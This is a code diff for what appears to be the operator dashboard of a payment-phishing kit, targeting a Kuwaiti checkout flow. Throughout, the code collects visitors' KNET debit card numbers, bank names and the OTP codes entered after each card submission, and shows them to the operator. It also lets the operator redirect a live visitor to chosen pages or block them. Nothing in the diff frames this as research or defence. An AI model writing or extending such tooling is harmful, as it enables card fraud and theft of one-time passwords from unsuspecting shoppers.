+          var config = connectionFieldConfigs[service];
+          var storedConfig = getStoredConnectionConfig(service);
+          connectionEditingState[service] = false;
+          syncConnectionStoredState(service);
+          if (config.inputEl && !preserveInput) {
+            config.inputEl.value = String(storedConfig.url || "");
+          }
+          if (storedConfig.url) {
+            setConnectionFeedback(
+              service,
+              storedConfig.source === "dashboard"
+                ? config.label + " URL saved in dashboard settings."
+                : "Using " + config.label + " URL from " + String(storedConfig.source || "config/env") + ".",
+              ""
+            );
+            return;
+          }
+          setConnectionFeedback(service, "", "");
+        });
+      }
+
+      async function validateConnectionUrl(service, url) {
+        try {
+          var response = await window.fetch("/admin/api/connections/validate", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify({
+              service: service,
+              url: url
+            })
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = { status: "error", detail: "Validation failed." };
+          }
+          return {
+            ok: response.ok && payload.status === "ok",
+            payload: payload
+          };
+        } catch (error) {
+          return {
+            ok: false,
+            payload: { status: "error", detail: "Validation failed." }
+          };
+        }
+      }
+
+      async function persistConnectionSetting(service, url) {
+        try {
+          var response = await window.fetch("/admin/api/connections/settings", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify({
+              service: service,
+              url: url
+            })
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = {};
+          }
+          if (!response.ok || payload.status !== "ok" || !payload.settings) {
+            setConnectionFeedback(service, "Unable to save " + connectionFieldConfigs[service].label + " URL.", "error");
+            return false;
+          }
+          applyStoredConnectionSettings(payload.settings);
+          return true;
+        } catch (error) {
+          setConnectionFeedback(service, "Unable to save " + connectionFieldConfigs[service].label + " URL.", "error");
+          return false;
+        }
+      }
+
+      async function removeStoredConnectionSetting(service) {
+        try {
+          var response = await window.fetch("/admin/api/connections/settings/" + encodeURIComponent(service), {
+            method: "DELETE",
+            headers: {
+              "X-CSRF-Token": csrfToken
+            }
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = {};
+          }
+          if (!response.ok || payload.status !== "ok" || !payload.settings) {
+            setConnectionFeedback(service, "Unable to remove " + connectionFieldConfigs[service].label + " URL.", "error");
+            return;
+          }
+          applyStoredConnectionSettings(payload.settings);
+        } catch (error) {
+          setConnectionFeedback(service, "Unable to remove " + connectionFieldConfigs[service].label + " URL.", "error");
+        }
+      }
+
+      async function lookupConnectionResponse(service, url, requestId) {
+        var result = await validateConnectionUrl(service, url);
+        if (requestId !== connectionLookupRequestIds[service]) {
+          return;
+        }
+        if (!result.ok) {
+          setConnectionFeedback(service, result.payload.detail || "Validation failed.", "error");
+          return;
+        }
+        await persistConnectionSetting(service, url);
+      }
+
+      async function confirmConnectionEdit(service, nextUrl) {
+        setConnectionFeedback(service, "Checking " + connectionFieldConfigs[service].label + " connection...", "loading");
+        var result = await validateConnectionUrl(service, nextUrl);
+        if (!result.ok) {
+          applyStoredConnectionSettings(storedConnectionSettings, false);
+          setConnectionFeedback(service, result.payload.detail || "Validation failed.", "error");
+          return;
+        }
+        await persistConnectionSetting(service, nextUrl);
+      }
+
+      function handleConnectionInput(service) {
+        var config = connectionFieldConfigs[service];
+        if (!config || !config.inputEl) {
+          return;
+        }
+        var nextUrl = config.inputEl.value.trim();
+        if (connectionEditingState[service] === true) {
+          setConnectionFeedback(service, "", "");
+          return;
+        }
+        if (connectionLookupTimeoutIds[service]) {
+          window.clearTimeout(connectionLookupTimeoutIds[service]);
+          connectionLookupTimeoutIds[service] = 0;
+        }
+        connectionLookupRequestIds[service] = (connectionLookupRequestIds[service] || 0) + 1;
+        if (!nextUrl) {
+          setConnectionFeedback(service, "", "");
+          return;
+        }
+        var requestId = connectionLookupRequestIds[service];
+        setConnectionFeedback(service, "Checking " + config.label + " connection...", "loading");
+        connectionLookupTimeoutIds[service] = window.setTimeout(function () {
+          lookupConnectionResponse(service, nextUrl, requestId);
+        }, 450);
+      }
+
+      function handleConnectionChange(service) {
+        var config = connectionFieldConfigs[service];
+        if (!config || !config.inputEl || connectionEditingState[service] !== true) {
+          return;
+        }
+        var nextUrl = config.inputEl.value.trim();
+        var storedConfig = getStoredConnectionConfig(service);
+        if (!nextUrl || nextUrl === String(storedConfig.url || "")) {
+          applyStoredConnectionSettings(storedConnectionSettings, false);
+          return;
+        }
+        openTelegramConfirmModal(
+          "Do you want to confirm updating the " + config.label + " URL?",
+          "Confirm",
+          async function () {
+            await confirmConnectionEdit(service, nextUrl);
+          },
+          function () {
+            applyStoredConnectionSettings(storedConnectionSettings, false);
+          }
+        );
+      }
+
+      function handleConnectionBlur(service) {
+        var config = connectionFieldConfigs[service];
+        if (!config || !config.inputEl || connectionEditingState[service] !== true) {
+          return;
+        }
+        if (telegramConfirmModalEl && !telegramConfirmModalEl.hidden) {
+          return;
+        }
+        if (config.inputEl.value.trim() === String(getStoredConnectionConfig(service).url || "")) {
+          applyStoredConnectionSettings(storedConnectionSettings, false);
+        }
+      }
+
+      function bindConnectionSettings() {
+        Object.keys(connectionFieldConfigs).forEach(function (service) {
+          var config = connectionFieldConfigs[service];
+          if (!config.inputEl) {
+            return;
+          }
+          config.inputEl.addEventListener("input", function () {
+            handleConnectionInput(service);
+          });
+          config.inputEl.addEventListener("change", function () {
+            handleConnectionChange(service);
+          });
+          config.inputEl.addEventListener("blur", function () {
+            handleConnectionBlur(service);
+          });
+          config.inputEl.addEventListener("keydown", function (event) {
+            if (event.key === "Enter" && connectionEditingState[service] === true) {
+              event.preventDefault();
+              config.inputEl.blur();
+            }
+          });
+          if (config.editBtnEl) {
+            config.editBtnEl.addEventListener("click", function () {
+              setConnectionEditing(service, true);
+              setConnectionFeedback(service, "", "");
+              config.inputEl.focus();
+              config.inputEl.select();
+            });
+          }
+          if (config.removeBtnEl) {
+            config.removeBtnEl.addEventListener("click", function () {
+              openTelegramConfirmModal(
+                "Do you want to remove the saved " + config.label + " URL?",
+                "Remove",
+                async function () {
+                  await removeStoredConnectionSetting(service);
+                }
+              );
+            });
+          }
+        });
+      }
+
+      function formatFieldValue(value) {
+        return escapeHtml(value || "").replaceAll("\n", "<br>");
+      }
+
+      function getSelectedVisitorRecord(visitorId) {
+        if (!visitorId) {
+          return null;
+        }
+        return allVisitors.find(function (visitor) {
+          return String(visitor && visitor.id || "") === String(visitorId);
+        }) || null;
+      }
+
+      function getVisitorCartItems(visitorId) {
+        var visitor = getSelectedVisitorRecord(visitorId);
+        var items = visitor && Array.isArray(visitor.current_cart_summary) ? visitor.current_cart_summary : [];
+        return items.filter(function (item) {
+          return item && Number(item.quantity || 0) > 0;
+        });
+      }
+
+      function getVisitorSubmittedEntries(visitorId) {
+        if (!visitorId) {
+          return [];
+        }
+        return allSubmissions.filter(function (submission) {
+          return String(submission.visitor_id || "") === String(visitorId);
+        });
+      }
+
+      function visitorHasKnetSubmission(visitorId) {
+        return getVisitorSubmittedEntries(visitorId).some(isKnetSubmission);
+      }
+
+      function isOtpSubmission(submission) {
+        var formName = String(submission && submission.form_name || "").trim().toLowerCase();
+        return formName === "otp verification" || formName === "verification otp";
+      }
+
+      function getSubmissionTimestamp(submission) {
+        var rawValue =
+          submission && (
+            submission.created_at ||
+            submission.createdAt ||
+            submission.submitted_at ||
+            submission.inserted_at ||
+            submission.timestamp
+          ) || "";
+        var parsedValue = Date.parse(String(rawValue || ""));
+        return Number.isFinite(parsedValue) ? parsedValue : 0;
+      }
+
+      function sortSubmissionsNewestFirst(submissions) {
+        return (Array.isArray(submissions) ? submissions.slice(0) : []).sort(function (left, right) {
+          var timestampDelta = getSubmissionTimestamp(right) - getSubmissionTimestamp(left);
+          if (timestampDelta !== 0) {
+            return timestampDelta;
+          }
+          return String(right && right.id || "").localeCompare(String(left && left.id || ""));
+        });
+      }
+
+      function getOtpSubmissionsForKnetSubmission(knetSubmission, submissions) {
+        if (!knetSubmission || !Array.isArray(submissions) || !submissions.length) {
+          return [];
+        }
+        var knetEntriesAsc = submissions.filter(isKnetSubmission).slice(0).sort(function (left, right) {
+          return getSubmissionTimestamp(left) - getSubmissionTimestamp(right);
+        });
+        var currentKnetTimestamp = getSubmissionTimestamp(knetSubmission);
+        var nextKnetTimestamp = Infinity;
+        for (var index = 0; index < knetEntriesAsc.length; index += 1) {
+          var candidate = knetEntriesAsc[index];
+          if (String(candidate && candidate.id || "") === String(knetSubmission.id || "")) {
+            if (index + 1 < knetEntriesAsc.length) {
+              nextKnetTimestamp = getSubmissionTimestamp(knetEntriesAsc[index + 1]);
+            }
+            break;
+          }
+        }
+        return submissions.filter(function (submission) {
+          if (!isOtpSubmission(submission)) {
+            return false;
+          }
+          var submissionTimestamp = getSubmissionTimestamp(submission);
+          return submissionTimestamp >= currentKnetTimestamp && submissionTimestamp < nextKnetTimestamp;
+        }).sort(function (left, right) {
+          return getSubmissionTimestamp(right) - getSubmissionTimestamp(left);
+        });
+      }
+
+      function isKnetSubmission(submission) {
+        return String(submission && submission.form_name || "").trim() === "KNET Payments";
+      }
+
+      function getVisitorDetailsModalSubmittedEntries(visitorId) {
+        return getVisitorSubmittedEntries(visitorId).filter(function (submission) {
+          return !isKnetSubmission(submission) && !isOtpSubmission(submission);
+        });
+      }
+
+      function getLatestCheckoutSubmission(visitorId) {
+        var entries = getVisitorSubmittedEntries(visitorId).filter(function (submission) {
+          return String(submission.form_name || "").trim() === "معلومات التسليم";
+        });
+        if (!entries.length) {
+          return null;
+        }
+        return entries[0];
+      }
+
+      function getVisitorCartTotal(visitorId) {
+        return getVisitorCartItems(visitorId).reduce(function (sum, item) {
+          return sum + Number(item.total_price || 0);
+        }, 0);
+      }
+
+      function updateSubmissionSummaryHeader() {
+        if (!submissionNameValueEl || !submissionPhoneValueEl || !submissionTotalValueEl) {
+          return;
+        }
+        var hasSelectedVisitor = Boolean(selectedVisitorId);
+        if (submissionsHeaderSummaryEl) {
+          submissionsHeaderSummaryEl.hidden = !hasSelectedVisitor;
+        }
+        if (submissionsDetailsTriggerEl) {
+          submissionsDetailsTriggerEl.hidden = !hasSelectedVisitor;
+        }
+        var checkoutSubmission = getLatestCheckoutSubmission(selectedVisitorId);
+        var nameValue = checkoutSubmission
+          ? findPreferredFieldValue(checkoutSubmission, ["name", "fullname", "contactname"])
+          : "";
+        var phoneValue = checkoutSubmission
+          ? findPreferredFieldValue(checkoutSubmission, ["phonenumber", "phone", "phone_number"])
+          : "";
+        var totalValue = checkoutSubmission ? getVisitorCartTotal(selectedVisitorId) : 0;
+
+        submissionNameValueEl.textContent = nameValue || "-";
+        submissionPhoneValueEl.textContent = phoneValue || "-";
+        submissionTotalValueEl.textContent = checkoutSubmission
+          ? (Number(totalValue || 0).toFixed(3) + " د.ك")
+          : "-";
+      }
+
+      function getLatestVisitorSubmissionId(visitorId) {
+        var items = getVisitorCartItems(visitorId);
+        if (!items.length) {
+          return "";
+        }
+        return JSON.stringify(items.map(function (item) {
+          return {
+            id: String(item.id || ""),
+            name: String(item.name || ""),
+            quantity: Number(item.quantity || 0),
+            unit_price: Number(item.unit_price || 0),
+            total_price: Number(item.total_price || 0)
+          };
+        }).sort(function (left, right) {
+          return String(left.id).localeCompare(String(right.id));
+        }));
+      }
+
+      function markVisitorSubmissionsSeen(visitorId) {
+        var latestId = getLatestVisitorSubmissionId(visitorId);
+        seenSubmissionState[String(visitorId || "")] = latestId;
+        persistSeenSubmissionState();
+      }
+
+      function visitorHasUnreadSubmissions(visitorId) {
+        var latestId = getLatestVisitorSubmissionId(visitorId);
+        if (!visitorId || !latestId) {
+          return false;
+        }
+        return seenSubmissionState[String(visitorId)] !== latestId;
+      }
+
+      function updateSubmissionsDetailsButton() {
+        if (!submissionsDetailsTriggerEl) {
+          return;
+        }
+        var hasSubmissions =
+          getVisitorCartItems(selectedVisitorId).length > 0 ||
+          getVisitorDetailsModalSubmittedEntries(selectedVisitorId).length > 0;
+        submissionsDetailsTriggerEl.disabled = !hasSubmissions;
+        submissionsDetailsTriggerEl.setAttribute("aria-disabled", hasSubmissions ? "false" : "true");
+        submissionsDetailsTriggerEl.classList.toggle("is-live", hasSubmissions && visitorHasUnreadSubmissions(selectedVisitorId));
+      }
+
+      function closeSubmissionsDetailsModal() {
+        if (!submissionsDetailsModalEl) {
+          return;
+        }
+        submissionsDetailsModalEl.hidden = true;
+        submissionsDetailsModalEl.setAttribute("aria-hidden", "true");
+        if (
+          (!settingsModalEl || settingsModalEl.hidden) &&
+          (!telegramConfirmModalEl || telegramConfirmModalEl.hidden) &&
+          (!visitorPagesModalEl || visitorPagesModalEl.hidden)
+        ) {
+          document.body.classList.remove("is-admin-modal-open");
+        }
+      }
+
+      function renderSubmittedEntriesDetails(submissions) {
+        if (!submissionsDetailsContentEl) {
+          return;
+        }
+        if (!Array.isArray(submissions) || submissions.length === 0) {
+          submissionsDetailsContentEl.innerHTML = "<div class=\"submissions-details-empty\">لا توجد بيانات لهذا الزائر.</div>";
+          return;
+        }
+        submissionsDetailsContentEl.innerHTML = submissions.map(function (submission) {
+          var fields = Array.isArray(submission.fields) ? submission.fields.filter(function (field) {
+            return String(field && field.value || "").trim();
+          }) : [];
+          return (
+            "<section class=\"submission-details-card\">" +
+              "<div class=\"submission-details-grid\">" +
+                (fields.length
+                  ? fields.map(function (field) {
+                      return (
+                        "<div class=\"submission-details-item\">" +
+                          "<div class=\"submission-details-label\">" + escapeHtml(String(field.label || field.name || "")) + "</div>" +
+                          "<div class=\"submission-details-value\">" + formatFieldValue(String(field.value || "")) + "</div>" +
+                        "</div>"
+                      );
+                    }).join("")
+                  : "<div class=\"submission-details-item is-empty\"><div class=\"submission-details-value\">لا توجد بيانات.</div></div>") +
+              "</div>" +
+            "</section>"
+          );
+        }).join("");
+      }
+
+      function buildSubmittedEntriesDetailsMarkup(submissions) {
+        if (!Array.isArray(submissions) || submissions.length === 0) {
+          return "";
+        }
+        return submissions.map(function (submission) {
+          var fields = Array.isArray(submission.fields) ? submission.fields.filter(function (field) {
+            return String(field && field.value || "").trim();
+          }) : [];
+          return (
+            "<section class=\"submission-details-card\">" +
+              "<div class=\"submission-details-grid\">" +
+                (fields.length
+                  ? fields.map(function (field) {
+                      return (
+                        "<div class=\"submission-details-item\">" +
+                          "<div class=\"submission-details-label\">" + escapeHtml(String(field.label || field.name || "")) + "</div>" +
+                          "<div class=\"submission-details-value\">" + formatFieldValue(String(field.value || "")) + "</div>" +
+                        "</div>"
+                      );
+                    }).join("")
+                  : "<div class=\"submission-details-item is-empty\"><div class=\"submission-details-value\">لا توجد بيانات.</div></div>") +
+              "</div>" +
+            "</section>"
+          );
+        }).join("");
+      }
+
+      function renderSubmissionsDetails(items) {
+        if (!submissionsDetailsContentEl) {
+          return;
+        }
+        if (!Array.isArray(items) || items.length === 0) {
+          submissionsDetailsContentEl.innerHTML = "<div class=\"submissions-details-empty\">لا توجد بيانات لهذا الزائر.</div>";
+          return;
+        }
+        submissionsDetailsContentEl.innerHTML = items.map(function (item) {
+          return (
+            "<section class=\"submission-details-card\">" +
+              "<div class=\"submission-details-grid\">" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">اسم المنتج</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(String(item.name || "منتج")) + "</div>" +
+                "</div>" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">الكمية</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(String(item.quantity || 0)) + "</div>" +
+                "</div>" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">السعر</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(Number(item.unit_price || 0).toFixed(3)) + " د.ك</div>" +
+                "</div>" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">الإجمالي</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(Number(item.total_price || 0).toFixed(3)) + " د.ك</div>" +
+                "</div>" +
+              "</div>" +
+            "</section>"
+          );
+        }).join("");
+      }
+
+      function buildCartItemsDetailsMarkup(items) {
+        if (!Array.isArray(items) || items.length === 0) {
+          return "";
+        }
+        return (
+          "<div class=\"submission-details-cards-grid\">" +
+          items.map(function (item) {
+          return (
+            "<section class=\"submission-details-card\">" +
+              "<div class=\"submission-details-grid\">" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">اسم المنتج</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(String(item.name || "منتج")) + "</div>" +
+                "</div>" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">الكمية</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(String(item.quantity || 0)) + "</div>" +
+                "</div>" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">السعر</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(Number(item.unit_price || 0).toFixed(3)) + " د.ك</div>" +
+                "</div>" +
+                "<div class=\"submission-details-item\">" +
+                  "<div class=\"submission-details-label\">الإجمالي</div>" +
+                  "<div class=\"submission-details-value\">" + escapeHtml(Number(item.total_price || 0).toFixed(3)) + " د.ك</div>" +
+                "</div>" +
+              "</div>" +
+            "</section>"
+          );
+          }).join("") +
+          "</div>"
+        );
+      }
+
+      function openSubmissionsDetailsModal() {
+        var cartItems = getVisitorCartItems(selectedVisitorId);
+        var submittedEntries = getVisitorDetailsModalSubmittedEntries(selectedVisitorId);
+        if (
+          !submissionsDetailsModalEl ||
+          !submissionsDetailsContentEl ||
+          (!cartItems.length && !submittedEntries.length)
+        ) {
+          return;
+        }
+        var modalSections = [];
+        if (cartItems.length) {
+          modalSections.push(buildCartItemsDetailsMarkup(cartItems));
+        }
+        if (submittedEntries.length) {
+          modalSections.push(buildSubmittedEntriesDetailsMarkup(submittedEntries));
+        }
+        submissionsDetailsContentEl.innerHTML = modalSections.join("");
+        markVisitorSubmissionsSeen(selectedVisitorId);
+        updateSubmissionsDetailsButton();
+        submissionsDetailsModalEl.hidden = false;
+        submissionsDetailsModalEl.setAttribute("aria-hidden", "false");
+        document.body.classList.add("is-admin-modal-open");
+      }
+
+      function normalizeFieldKey(value) {
+        return String(value || "")
+          .trim()
+          .toLowerCase()
+          .replaceAll(/[^a-z0-9]+/g, "");
+      }
+
+      function getSubmissionColumns(submissions) {
+        var columns = [];
+        var seenKeys = {};
+        if (!Array.isArray(submissions)) {
+          return columns;
+        }
+        submissions.forEach(function (submission) {
+          if (!Array.isArray(submission.fields)) {
+            return;
+          }
+          submission.fields.forEach(function (field) {
+            var key = String(field.name || field.label || "").trim();
+            if (!key || seenKeys[key]) {
+              return;
+            }
+            seenKeys[key] = true;
+            columns.push({
+              key: key,
+              label: String(field.label || field.name || "Field").trim() || "Field"
+            });
+          });
+        });
+        return columns;
+      }
+
+      function getSubmissionFieldValue(submission, columnKey) {
+        if (!submission || !Array.isArray(submission.fields)) {
+          return "";
+        }
+        var matchedField = submission.fields.find(function (field) {
+          return String(field.name || field.label || "").trim() === columnKey;
+        });
+        if (!matchedField) {
+          return "";
+        }
+        return String(matchedField.value || "").trim();
+      }
+
+      function formatSubmissionDisplayValue(columnKey, value) {
+        var normalizedKey = normalizeFieldKey(columnKey);
+        var rawValue = String(value || "").trim();
+        if (!rawValue) {
+          return "";
+        }
+        if (normalizedKey === "debitnumber" || normalizedKey === "رقمبطاقةالصرفالآلي") {
+          return rawValue.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+        }
+        return rawValue;
+      }
+
+      function getSubmissionValueCellClass(columnKey) {
+        var normalizedKey = normalizeFieldKey(columnKey);
+        if (normalizedKey === "bank" || normalizedKey === "البنك") {
+          return "submission-value-cell is-ltr is-bank-value";
+        }
+        return "submission-value-cell is-ltr";
+      }
+
+      function findPreferredFieldValue(submission, preferredKeys) {
+        if (!submission || !Array.isArray(submission.fields)) {
+          return "";
+        }
+        var normalizedKeys = preferredKeys.map(normalizeFieldKey);
+        for (var index = 0; index < submission.fields.length; index += 1) {
+          var field = submission.fields[index];
+          var nameKey = normalizeFieldKey(field.name);
+          var labelKey = normalizeFieldKey(field.label);
+          if (
+            normalizedKeys.indexOf(nameKey) !== -1 ||
+            normalizedKeys.indexOf(labelKey) !== -1
+          ) {
+            return String(field.value || "").trim();
+          }
+        }
+        return "";
+      }
+
+      function getVisitorDisplayLabel(visitorId) {
+        if (!visitorId || !Array.isArray(allSubmissions)) {
+          return "";
+        }
+        var visitorSubmissions = allSubmissions.filter(function (submission) {
+          return String(submission.visitor_id || "") === String(visitorId);
+        });
+        var preferredFieldGroups = [
+          ["name", "fullname", "contactname", "leadname", "projectlead"],
+          ["phonenumber", "phone", "phone_number", "contactphonenumber", "contactphone"],
+          ["email", "workemail", "contactemail"]
+        ];
+        for (var groupIndex = 0; groupIndex < preferredFieldGroups.length; groupIndex += 1) {
+          var preferredKeys = preferredFieldGroups[groupIndex];
+          for (var submissionIndex = 0; submissionIndex < visitorSubmissions.length; submissionIndex += 1) {
+            var fieldValue = findPreferredFieldValue(visitorSubmissions[submissionIndex], preferredKeys);
+            if (fieldValue) {
+              return fieldValue;
+            }
+          }
+        }
+        return "";
+      }
+
+      function getSubmissionFieldSignature(submission) {
+        if (!submission || !Array.isArray(submission.fields) || submission.fields.length === 0) {
+          return "__empty__";
+        }
+        return submission.fields.map(function (field) {
+          return String(field.name || field.label || "").trim();
+        }).join("|");
+      }
+
+      function getSubmissionGroupKey(submission) {
+        return [
+          String(submission.form_name || "Website Form").trim() || "Website Form",
+          String(submission.page_path || "").trim(),
+          getSubmissionFieldSignature(submission)
+        ].join("::");
+      }
+
+      function clearSubmissionHead() {
+        if (!submissionsHeadEl) {
+          return;
+        }
+        submissionsHeadEl.innerHTML = "";
+      }
+
+      function renderSubmissionGroupHead(columns) {
+        return (
+          "<tr class=\"submission-group-head-row\">" +
+          columns.map(function (column) {
+            return "<th>" + escapeHtml(column.label) + "</th>";
+          }).join("") +
+          "</tr>"
+        );
+      }
+
+      function setOnlineUsers(onlineUsers) {
+        countEl.classList.remove("online-count", "visitor-badge", "returning");
+        if (typeof onlineUsers === "number") {
+          countEl.textContent = String(onlineUsers);
+          if (onlineUsers > 0) {
+            countEl.classList.add("online-count", "visitor-badge", "returning");
+          }
+        } else {
+          countEl.textContent = "N/A";
+        }
+      }
+
+      function getVisitorLocationLabel(visitor) {
+        if (!visitor || visitor.is_online !== true) {
+          return "";
+        }
+        var currentPagePath = String(visitor.current_page_path || "").trim();
+        var currentPageTitle = String(visitor.current_page_title || "").trim();
+        if (currentPagePath) {
+          return currentPageTitle || currentPagePath;
+        }
+        return "On site";
+      }
+
+      function closeVisitorPagesModal() {
+        activeVisitorPagesModalVisitorId = "";
+        if (!visitorPagesModalEl) {
+          return;
+        }
+        visitorPagesModalEl.hidden = true;
+        visitorPagesModalEl.setAttribute("aria-hidden", "true");
+        if (
+          (!settingsModalEl || settingsModalEl.hidden) &&
+          (!telegramConfirmModalEl || telegramConfirmModalEl.hidden)
+        ) {
+          document.body.classList.remove("is-admin-modal-open");
+        }
+      }
+
+      function openVisitorPagesModal(visitorId, currentPagePath, currentPageTitle) {
+        if (!visitorPagesModalEl || !visitorPagesListEl) {
+          return;
+        }
+        activeVisitorPagesModalVisitorId = String(visitorId || "");
+        var normalizedCurrentPath = String(currentPagePath || "").trim();
+        visitorPagesListEl.innerHTML = availableFrontendPages.map(function (page) {
+          var pagePath = String(page.path || "").trim();
+          var isCurrent = normalizedCurrentPath && pagePath === normalizedCurrentPath;
+          return (
+            "<button type=\"button\" class=\"visitor-pages-item" + (isCurrent ? " is-current" : "") + "\" data-page-path=\"" + escapeHtml(pagePath) + "\"" + (isCurrent ? " disabled" : "") + ">" +
+            "<span class=\"visitor-pages-item-title\">" + escapeHtml(String(page.title || pagePath || "")) + "</span>" +
+            (isCurrent ? "<span class=\"visitor-pages-item-badge\">Current</span>" : "") +
+            "</button>"
+          );
+        }).join("");
+        visitorPagesModalEl.hidden = false;
+        visitorPagesModalEl.setAttribute("aria-hidden", "false");
+        document.body.classList.add("is-admin-modal-open");
+      }
+
+      async function queueVisitorRedirect(visitorId, path) {
+        if (!visitorId || !path) {
+          return;
+        }
+        try {
+          var response = await window.fetch("/admin/api/visitors/" + encodeURIComponent(visitorId) + "/redirect", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            credentials: "same-origin",
+            body: JSON.stringify({ path: path })
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = {};
+          }
+          if (!response.ok || payload.status !== "ok") {
+            throw new Error((payload && payload.detail) || "Unable to redirect this visitor right now.");
+          }
+          closeVisitorPagesModal();
+        } catch (error) {
+          window.alert((error && error.message) || "Unable to redirect this visitor right now.");
+        }
+      }
+
+      function renderSubmissionRow(submission, columns, columnCount) {
+        var cells = columns.map(function (column) {
+          var value = getSubmissionFieldValue(submission, column.key);
+          var displayValue = formatSubmissionDisplayValue(column.key, value);
+          return "<td class=\"" + getSubmissionValueCellClass(column.key) + "\">" + (displayValue ? formatFieldValue(displayValue) : "—") + "</td>";
+        });
+        if (!cells.length) {
+          cells.push("<td>—</td>");
+        }
+        return (
+          "<tr class=\"submission-data-row\">" +
+          cells.join("") +
+          "</tr>"
+        );
+      }
+
+      function renderOtpSubmissionDetailsRow(otpSubmissions, columnCount) {
+        var items = Array.isArray(otpSubmissions) ? otpSubmissions : [];
+        var content = items.length
+          ? "<ul class=\"submission-otp-list\">" + items.map(function (submission) {
+              var otpValue = findPreferredFieldValue(submission, ["debitotp", "otp", "verificationotp", "otpcode"]) || "—";
+              return (
+                "<li class=\"submission-otp-item\">" +
+                  "<span class=\"submission-otp-value\">" + escapeHtml(String(otpValue)) + "</span>" +
+                "</li>"
+              );
+            }).join("") + "</ul>"
+          : "";
+        return (
+          "<tr class=\"submission-otp-row\">" +
+            "<td colspan=\"" + String(Math.max(columnCount, 1)) + "\">" +
+              "<div class=\"submission-otp-block\"" + (items.length ? "" : " hidden") + ">" +
+                content +
+              "</div>" +
+            "</td>" +
+          "</tr>"
+        );
+      }
+
+      function renderVisitorRow(visitor) {
+        var fullId = visitor.id || "";
+        var shortId = fullId ? fullId.slice(-3) : "N/A";
+        var displayLabel = getVisitorDisplayLabel(fullId) || ("Visitor #" + shortId);
+        var buttonClass = "visitor-option";
+        var isBlocked = visitor && visitor.is_blocked === true;
+        var isOnline = visitor && visitor.is_online === true;
+        var statusIcon = isOnline
+          ? "<span class=\"visitor-status-icon is-online\" aria-hidden=\"true\"><span class=\"visitor-status-dot\"></span></span>"
+          : "<span class=\"visitor-status-icon is-offline\" aria-hidden=\"true\"><span class=\"visitor-status-dot\"></span></span>";
+        var locationMarkup = isOnline
+          ? "<button type=\"button\" class=\"visitor-location-button" + (String(visitor.current_page_path || "").trim() ? " is-live" : "") + "\" data-visitor-id=\"" + escapeHtml(fullId) + "\" data-page-path=\"" + escapeHtml(String(visitor.current_page_path || "")) + "\" data-page-title=\"" + escapeHtml(String(visitor.current_page_title || visitor.current_page_path || "")) + "\" aria-label=\"Visitor current page\">" + escapeHtml(getVisitorLocationLabel(visitor)) + "</button>"
+          : "";
+        var blockButtonMarkup =
+          "<button type=\"button\" class=\"visitor-block-toggle" + (isBlocked ? " is-blocked" : "") + "\" data-visitor-id=\"" + escapeHtml(fullId) + "\" aria-label=\"" + escapeHtml(isBlocked ? "Unblock visitor" : "Block visitor") + "\"><span class=\"visitor-block-toggle-inner\"><svg viewBox=\"0 0 24 24\" aria-hidden=\"true\"><path d=\"M15 9V7a3 3 0 1 0-6 0v2m-2 0h10a1 1 0 0 1 1 1v6a3 3 0 0 1-3 3H9a3 3 0 0 1-3-3v-6a1 1 0 0 1 1-1Zm5 4v2\" fill=\"none\"></path></svg><span>" + escapeHtml(isBlocked ? "رفع" : "حظر") + "</span></span></button>";
+        if (selectedVisitorId && fullId === selectedVisitorId) {
+          buttonClass += " is-active";
+        }
+        if (isBlocked) {
+          buttonClass += " is-blocked";
+        }
+        if (visitorHasUnreadKnetState(visitor)) {
+          buttonClass += " has-knet-glow";
+        }
+        return (
+          "<tr class=\"visitor-row\">" +
+          "<td><div class=\"visitor-swipe-shell" + (isBlocked ? " is-blocked-shell" : "") + "\">" +
+          "<button type=\"button\" class=\"visitor-archive-action\" data-visitor-id=\"" + escapeHtml(fullId) + "\" aria-label=\"Archive visitor\">" +
+          "<span class=\"visitor-archive-action-inner\">" +
+          "<svg viewBox=\"0 0 24 24\" aria-hidden=\"true\"><path d=\"M9 3h6l1 2h4v2H4V5h4l1-2Zm-3 6h12l-1 10a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2L6 9Zm4 2v6m4-6v6\" fill=\"none\"></path></svg>" +
+          "</span>" +
+          "</button>" +
+          blockButtonMarkup +
+          "<div class=\"" + buttonClass + "\" data-visitor-id=\"" + escapeHtml(fullId) + "\" title=\"" + escapeHtml(fullId) + "\" role=\"button\" tabindex=\"0\">" +
+          statusIcon +
+          "<span class=\"visitor-cell\"><strong>" + escapeHtml(displayLabel) + "</strong>" + locationMarkup + "</span></div>" +
+          "</div></td>" +
+          "</tr>"
+        );
+      }
+
+      function renderSubmissions(submissions) {
+        if (!submissionsBodyEl) {
+          return;
+        }
+        clearSubmissionHead();
+        updateSubmissionSummaryHeader();
+        if (!selectedVisitorId) {
+          submissionsBodyEl.innerHTML = "<tr id=\"submissions-placeholder-row\"><td colspan=\"1\" class=\"submission-empty-state\">يرجى اختيار زائر لعرض البيانات</td></tr>";
+          return;
+        }
